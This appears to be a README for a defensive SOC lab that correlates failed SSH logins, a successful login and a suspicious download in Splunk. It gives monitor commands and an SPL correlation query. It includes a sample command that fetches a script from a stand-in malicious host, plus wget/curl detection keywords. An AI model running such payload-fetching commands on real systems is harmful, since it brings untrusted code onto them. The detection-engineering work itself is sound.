# 🔐 Log Correlation & Detection Engineering

This project simulates a multi-stage attack chain using Linux SSH logs and bash history, showcasing how a SOC Analyst correlates
brute-force login attempts, successful access,and post-login command execution using Splunk.

---

## 🎯 Objective

Correlate these stages:
- ❌ Multiple failed SSH login attempts
- ✅ One successful login
- ⚠️ Suspicious `wget` command used to download a potential payload

---

## 🧪 Simulated Activity

### 🔹 1. SSH Brute-force (Failed)

ssh testuser@127.0.0.1
# Enter wrong password 5 times

🔹 2. SSH Success


ssh testuser@127.0.0.1
# Enter correct password

3. Suspicious Command

wget http://malicious-site.com/bad.sh

🛠️ Splunk Setup (CLI-Only)
Monitored the following log files:

# Authentication logs (already monitored)
sudo /opt/splunk/bin/splunk add monitor /var/log/auth.log -sourcetype linux_secure

# Bash command history (for wget/curl detection)
sudo /opt/splunk/bin/splunk add monitor /home/testuser/.bash_history -sourcetype bash_history

# Restart Splunk
sudo /opt/splunk/bin/splunk restart
🔎 Detection Logic (SPL)

(index=* sourcetype=linux_secure "Failed password" OR "Accepted password")

OR (index=* sourcetype=bash_history "wget" OR "curl")

| transaction user maxspan=10m

| search eventcount>=6

| table _time user host eventcount



# ✅ Outcome
Stage	Log Source

Failed logins	/var/log/auth.log

Successful login	/var/log/auth.log

wget command	.bash_history

The SPL successfully tied together all three elements, simulating a detection that would trigger in a real-world SOC for lateral movement or data staging activity.
